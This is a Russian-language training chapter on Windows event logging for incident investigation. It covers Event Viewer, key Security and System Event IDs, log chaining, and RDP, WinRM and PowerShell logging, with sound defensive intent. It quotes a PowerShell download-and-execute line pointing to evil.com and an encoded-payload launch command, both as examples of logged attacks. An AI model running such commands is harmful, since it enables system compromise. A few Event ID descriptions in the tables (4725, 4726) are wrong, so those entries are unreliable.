# Базовое журналирование

> [!info] Путь в курсе
> Глава 3: Windows-системы и их безопасность / Часть 1: Host-Base Windows

**Журналирование** - это процесс автоматической фиксации событий, происходящих в операционной системе и приложениях, с сохранением сведений о времени, источнике и характере каждого события. Без такой фиксации восстановить хронологию инцидента постфактум невозможно: любые выводы о том, что именно произошло в системе, опираются на записи, оставленные её собственными механизмами журналирования. В инфраструктуре Windows **базовое журналирование** реализовано на уровне операционной системы и не требует установки дополнительного программного обеспечения - события фиксируются штатными средствами и хранятся локально до тех пор, пока не будут перезаписаны новыми записями или выгружены во внешнюю систему хранения.

## Архитектура Event Viewer и базовые журналы

Основой для сбора диагностической информации и данных о безопасности в инфраструктуре выступает встроенный системный инструмент **Event Viewer**. Открыть его можно комбинацией **Win + R** → **eventvwr.msc** → **Enter** - откроется интерфейс, который является консолью управления для службы **Windows Event Log**.

![](../../_images/bddd13ec56d6.webp)

Логи основаны на бинарном формате **EVTX**, который под капотом использует жёстко структурированный **Extensible Markup Language (XML)**. На уровне файловой системы эти файлы физически располагаются в защищённой системной директории **C:\Windows\System32\winevt\Logs**. Бинарная структура формата **EVTX** включает в себя цепочки блоков и криптографические контрольные суммы. Это сделано специально: любые топорные попытки злоумышленника открыть файл в текстовом редакторе и стереть отдельную строчку с записью о своём входе неизбежно нарушат контрольную сумму всего блока, сделав файл нечитаемым, что сразу выдаст факт компрометации.

![](../../_images/e6b4b4cf25d0.webp)

В левой панели инструмента представлено множество папок, но фундамент системы держится на трёх главных системных журналах. Журнал **Application** хранит события пользовательского уровня и уровня прикладных сервисов - если внезапно упал сервер баз данных, завис графический интерфейс сторонней программы или антивирус заблокировал подозрительный скрипт, следы этого события нужно искать именно здесь. Журнал **System** - это зона ответственности ядра операционной системы: сюда пишут драйверы устройств, системные службы через **Service Control Manager (SCM)** и подсистема диспетчера управления памятью, и именно здесь можно найти информацию о том, почему сервер ушёл в синий экран (**BSOD**), почему не запустилась критическая служба или отвалился сетевой интерфейс. Журнал **Security** - святая святых любого специалиста по безопасности: в этот журнал имеет эксклюзивное право записи только процесс **Local Security Authority Subsystem Service (LSASS)**, здесь фиксируются абсолютно все попытки входа в систему, выходы, применение политик безопасности, изменения прав доступа к файлам и создание новых процессов (если включён соответствующий аудит). Обычный администратор может читать этот журнал, но даже он не имеет прав на прямую запись в него фейковых событий.

### Структура события

Каждое событие в **Event Viewer** - это структурированная запись со следующими полями:

| Поле | Описание |
|---|---|
| Level | Важность: Information, Warning, Error, Critical |
| Logged | Когда произошло |
| Source | Компонент, создавший событие |
| Event ID | Числовой идентификатор типа события |
| Task Category | Группировка событий внутри источника |
| User | Учётная запись, связанная с событием |
| Computer | Имя компьютера |

![](../../_images/0e1b568837b1.webp)

Поле **Event ID** в этой структуре - самое практически важное: именно по нему специалист ориентируется в потоке событий, и у самых частых из них стоит знать значение наизусть.

## Критические коды событий: шпаргалка для администратора

Знание ключевых **Event ID** - это как знание азбуки Морзе для связиста. Без такого знания невозможно быстро понять, что происходит с системой.

### События авторизации и входа (Security Log)

Первая и самая частая категория событий связана с попытками входа в систему - именно здесь чаще всего проявляются первые признаки атаки.

| Event ID | Описание | Когда искать |
|---|---|---|
| 4624 | Успешный вход в систему | Нормальная активность пользователя |
| 4625 | Неудачная попытка входа (неправильный пароль, заблокированная учётная запись) | Брутфорс-атака - много таких событий подряд |
| 4648 | Вход с явными учётными данными ( runas ) | Использование Run as different user |
| 4672 | Вход с правами администратора | Учётная запись получила права админа |
| 4634 / 4647 | Выход из системы / инициированный пользователем выход | Завершение сессии |
| 4776 | Проверка учётных данных контроллером домена | Аутентификация в домене |
| 4768 | Запрос билета Kerberos ( TGT ) | Доменная аутентификация |
| 4771 | Неудачный запрос Kerberos | Проблемы с доменной аутентификацией |

### События изменения учётных записей (Security Log)

Следующая категория фиксирует любые изменения самих учётных записей - создание, включение, смену пароля или изменение членства в группах.

| Event ID | Описание | Когда искать |
|---|---|---|
| 4720 | Создание учётной записи пользователя | Подозрительно, если создание не было запланировано |
| 4722 | Включение учётной записи | Включили отключённого пользователя |
| 4723 / 4724 | Смена пароля / самостоятельная смена пароля | Отслеживание изменений |
| 4725 | Удаление учётной записи | Кто удалил пользователя |
| 4726 | Удаление пользователя из группы | Изменение прав |
| 4732 | Добавление пользователя в локальную группу (например, в Administrators ) | Повышение привилегий |
| 4740 | Блокировка учётной записи | Account locked out |

### События доступа к объектам (Security Log)

Третья категория показывает, кто и когда обращался к конкретным файлам, папкам или ключам реестра - но только если для этих объектов включён соответствующий аудит.

| Event ID | Описание | Когда искать |
|---|---|---|
| 4657 | Изменение значения ключа реестра | Отслеживание изменений в реестре |
| 4663 | Доступ к файлу или папке | Кто открыл секретный документ |
| 5140 | Доступ к сетевой папке ( SMB ) | Кто подключился к общему ресурсу |
| 5145 | Проверка доступа к сетевой папке (детально) | Детальный аудит сетевого доступа |

### События процессов и выполнения кода (Security Log)

Четвёртая категория - события, связанные с запуском и завершением процессов, то есть с тем, что именно выполнялось на системе.

| Event ID | Описание | Когда искать |
|---|---|---|
| 4688 | Создание нового процесса | Что запускалось на системе |
| 4689 | Завершение процесса | Завершился процесс |
| 4698 | Создание запланированной задачи | Закрепление в системе |
| 4699 | Удаление запланированной задачи | Очистка следов |
| 4700 / 4702 | Включение / обновление запланированной задачи | Изменения в автозагрузке |

### Системные события и сбои (System Log)

Пятая категория относится уже не к журналу **Security,** а к **System** - это сбои и системные события, не связанные напрямую с безопасностью, но критичные для диагностики.

| Event ID | Описание | Когда искать |
|---|---|---|
| 1001 | BSOD (синий экран смерти) | Системный сбой |
| 41 | Завершение работы в аварийном режиме | Сбой питания, зависание, аппаратная проблема |
| 6005 / 6006 | Запуск / остановка Event Log service | Система загрузилась / выключилась |
| 6008 | Предыдущее завершение работы было аварийным | Предупреждение о сбое |
| 7022 / 7023 | Служба зависла / не запустилась | Проблемы со службами |

### События, связанные с журналированием (Security Log)

Последняя категория касается самого механизма журналирования - и именно она чаще всего выдаёт попытки замести следы.

| Event ID | Описание | Красный флаг |
|---|---|---|
| 1102 | Журнал безопасности был очищен | Злоумышленник заметает следы |
| 1100 | Служба Event Log была остановлена | Отключение журналирования |
| 1105 | Журнал событий был архивирован | Легальная операция или подготовка к очистке |

> **Важно.** Событие **1102** - это один из самых критических индикаторов компрометации. Если оно появляется в журнале, это почти всегда означает, что злоумышленник пытается скрыть свои действия. Стоит обратить внимание на время события: если оно произошло в нерабочее время или сразу после подозрительной активности - это повод поднять тревогу.

Перечисленные **Event ID** полезны сами по себе, но настоящую ценность они показывают только вместе - когда несколько разных событий выстраиваются в одну хронологию.

## Цепочка логов: жизненный цикл процесса

Самая частая ошибка, которую совершает **специалист** - это попытка анализировать логи изолированно друг от друга. Хакерская атака или системный сбой - это никогда не одно событие, это всегда история. Чтобы увидеть полную картину инцидента от начала и до конца, события нужно выстраивать в цепочку.

**Например, разберем такой пример:**

### Шаг 1. Авторизация в системе: Event ID 4624 и 4625

Любая активность начинается с аутентификации. Как только пользователь (или злоумышленник) пытается войти в систему, процесс **LSASS** генерирует событие в журнале **Security**.

Событие **4625** означает неудачную попытку входа: сотни таких событий за одну минуту с одним и тем же именем пользователя означают, что сервер прямо сейчас атакуют методом **Brute-Force**. Событие **4624** означает успешный вход, и внутри него есть критически важный параметр **Logon Type** - **Logon Type 2** означает, что человек физически сидел за клавиатурой сервера, **Logon Type 3** - сетевой доступ (кто-то зашёл в расшаренную папку), а **Logon Type 10** - успешное подключение через RDP. Анализ типа входа позволяет определить вектор проникновения.

Успешный вход - это только начало цепочки: то, какими правами обладает вошедший, определяет следующий шаг.

### Шаг 2. Получение привилегий: Event ID 4672

Как только пользователь успешно вошёл, система выдаёт ему **Access Token**. Если этот пользователь обладает правами локального администратора, система немедленно генерирует **Event ID 4672** (Назначение специальных привилегий новому сеансу). Цепочка **4624 Logon Type 10 → мгновенный 4672** при анализе означает, что кто-то только что удалённо зашёл на сервер с максимальными привилегиями.

Получив нужные привилегии, злоумышленник переходит от простого присутствия в системе к активным действиям - и первое, что обычно фиксируется дальше, это запуск консоли или скрипта.

### Шаг 3. Запуск целевой программы: Event ID 4688

Пользователь открыл консоль или запустил скрипт. Ядро создаёт новый процесс, в журнале **Security** появляется **Event ID 4688**. По умолчанию это событие показывает только имя запущенного файла. Специалист обязан включить аудит командной строки - тогда внутри события **4688** будет виден полный текст команды, например: `powershell.exe -ExecutionPolicy Bypass -enc <Base64_Payload>`.

Не каждая запущенная программа отрабатывает штатно - иногда попытка эксплуатации оставляет по себе куда более грубый след.

### Шаг 4. Падение или сбой: Event ID 1000

Если запущенная программа обратилась к защищённой области памяти, ядро принудительно убивает процесс. В журнале **Application** генерируется **Event ID 1000** (**Application Error**). В теле лога - имя сбойного модуля (например, **ntdll.dll**) и код исключения (например, **0xc0000005** - **Access Violation**).

![](../../_images/fb326dd3de97.webp)

Связывая эти события воедино, можно увидеть полную историю: злоумышленник подобрал пароль (множество **4625**, затем один **4624**), получил токен админа (**4672**), запустил консоль с вредоносными аргументами (**4688**), но его эксплойт вызвал сбой (**1000**). Именно так и анализируют инциденты на практике - не по одному событию, а по цепочке.

Разобранная цепочка опирается только на три базовых журнала. Но значительная часть активности в реальной инфраструктуре - удалённые подключения, работа в консоли **PowerShell** - в них попросту не фиксируется.

## Дополнительные журналы: удалённый доступ и PowerShell

Помимо трёх базовых журналов, Windows ведёт десятки специализированных журналов в разделе **Applications and Services Logs**. Для расследования инцидентов особую ценность представляют журналы удалённого доступа и **PowerShell**.

### Журналы удалённого доступа

**RDP (Remote Desktop)**

| Журнал | Путь в дереве Event Viewer | Что фиксирует |
|---|---|---|
| TerminalServices-RemoteConnectionManager | Applications and Services Logs → Microsoft → Windows → TerminalServices-RemoteConnectionManager → Operational | Входящие RDP -подключения, Event ID 1149 - успешная аутентификация пользователя |
| TerminalServices-LocalSessionManager | Applications and Services Logs → Microsoft → Windows → TerminalServices-LocalSessionManager → Operational | Создание и завершение сессий: 21 - вход, 23 - выход, 24 - отключение, 25 - переподключение |
| Security | Windows Logs → Security | 4624 с Logon Type 10 ( RemoteInteractive ) - успешный RDP -вход |

> **Важно для расследований:** **Event ID** **1149** в **RemoteConnectionManager** фиксируется даже при неудачных попытках входа после успешного установления RDP-соединения. Это позволяет видеть, кто пытался подключиться, даже если пароль был введён неверно.

Если **RDP** - это интерактивный удалённый рабочий стол, то **WinRM** и **PowerShell Remoting** дают доступ к серверу без графического интерфейса вообще, но с не менее подробным следом в журналах

**WinRM / PowerShell Remoting**

| Журнал | Путь в дереве Event Viewer | Что фиксирует |
|---|---|---|
| WinRM | Applications and Services Logs → Microsoft → Windows → WinRM → Operational | Входящие WinRM -соединения, ошибки аутентификации |
| PowerShell-Remoting | Applications and Services Logs → Microsoft → Windows → PowerShell → Operational | Удалённые PowerShell -сессии |
| Security | Windows Logs → Security | 4624 с Logon Type 3 ( Network ) - сетевой вход через WinRM |

Команда PowerShell, для включения журнала WinRM: `wevtutil sl Microsoft-Windows-WinRM/Operational /e:true`

Журналы удалённого доступа показывают, кто и как подключился к системе. Но то, что делает **PowerShell** после этого подключения, фиксируется совершенно отдельным механизмом журналирования.

### Журналы PowerShell

**PowerShell** - самый мощный инструмент в руках как администратора, так и злоумышленника. Именно поэтому его журналирование нужно настраивать отдельно и тщательно.

**Три уровня журналирования PowerShell:**

| Уровень | Журнал | Event ID | Что фиксирует |
|---|---|---|---|
| Module Logging | Microsoft-Windows-PowerShell/Operational | 4103 | Входные/выходные данные каждого модуля и конвейера |
| Script Block Logging | Microsoft-Windows-PowerShell/Operational | 4104 | Полный текст каждого выполняемого блока кода, включая декодированный Base64 |
| Transcription | Текстовый файл на диске | - | Полная стенограмма сессии: команды + вывод |

**Включение через GPO:** **Computer Configuration** → **Administrative Templates** → **Windows Components** → **Windows PowerShell**

Внутри нужно включить две политики:

1. **Turn on Module Logging** в значении **Enabled**, указав в поле **Module Names** все модули
2. **Turn on PowerShell Script Block Logging** в значении **Enabled**

> **Script Block Logging - самое важное.** Даже если злоумышленник обфусцировал команду через **Base64** или несколько слоёв кодирования, PowerShell декодирует её перед выполнением - и именно в этот момент **Event ID 4104** фиксирует финальный читаемый код. Пример того, что попадёт в лог:

**ScriptBlock ID: {abc-123}** **ScriptBlock Text:** **IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')**

> **Предупреждение.** **Script Block Logging** может генерировать большой объём данных на активно используемых системах. Рекомендуется включать его в первую очередь на серверах и привилегированных рабочих станциях.

**EVTX**-журналы **PowerShell** дают структурированную запись каждого блока кода. Но у **PowerShell** есть и куда более простой источник данных - обычный текстовый файл истории команд.

### Текстовые лог-файлы: PowerShell History

Помимо **EVTX**-журналов, **PowerShell** ведёт текстовую историю команд в профиле пользователя. Это не журнал безопасности - это удобство для пользователя, но для следователя это ценнейший артефакт.

**Расположение файла истории:** **C:\Users\&lt;Username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt**

**Что там хранится?** Последние 4096 команд, введённых пользователем в интерактивной сессии **PowerShell**. Файл - обычный текст, не требует специальных инструментов для чтения.

Посмотреть историю текущего пользователя: `Get-Content (Get-PSReadLineOption).HistorySavePath`

Найти историю всех пользователей на системе: `Get-ChildItem C:\Users\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

> **Ограничения:** история не пишется в неинтерактивных сессиях (**скрипты, WinRM**) и может быть очищена командой **Clear-History**. При расследовании этот файл стоит проверять в первую очередь - злоумышленники часто о нём забывают.

**PowerShell** - не единственный источник текстовых логов на системе; есть ещё несколько файлов, которые стоит проверять при расследовании инцидента.

**Другие текстовые лог-файлы, важные при расследовании:**

| Файл | Расположение | Что содержит |
|---|---|---|
| IIS Access Log | C:\inetpub\logs\LogFiles\ | HTTP -запросы к веб-серверу |
| Windows Firewall Log | C:\Windows\System32\LogFiles\Firewall\pfirewall.log | Разрешённые и заблокированные соединения (нужно включить) |
| Scheduled Tasks | C:\Windows\System32\Tasks\ | XML -файлы задач планировщика |
| Prefetch | C:\Windows\Prefetch\ | Следы запуска программ (требует утилит для чтения) |

Например, команда включения логов **Windows Firewall** может выглядеть следующим образом:

```
Set-NetFirewallProfile -Profile Domain,Public,Private `
-LogAllowed True -LogBlocked True `
-LogFileName "%SystemRoot%\System32\LogFiles\Firewall\pfirewall.log"
```

Ни один из перечисленных источников не даёт полной картины сам по себе: **Event Viewer** фиксирует системные события и события безопасности, журналы **PowerShell** показывают, что именно выполнялось в консоли, а текстовые логи вроде истории команд, IIS или firewall дополняют картину там, где **EVTX** ничего не пишет. Полноценное расследование инцидента почти всегда складывается из сопоставления нескольких таких источников, а не из чтения одного журнала.
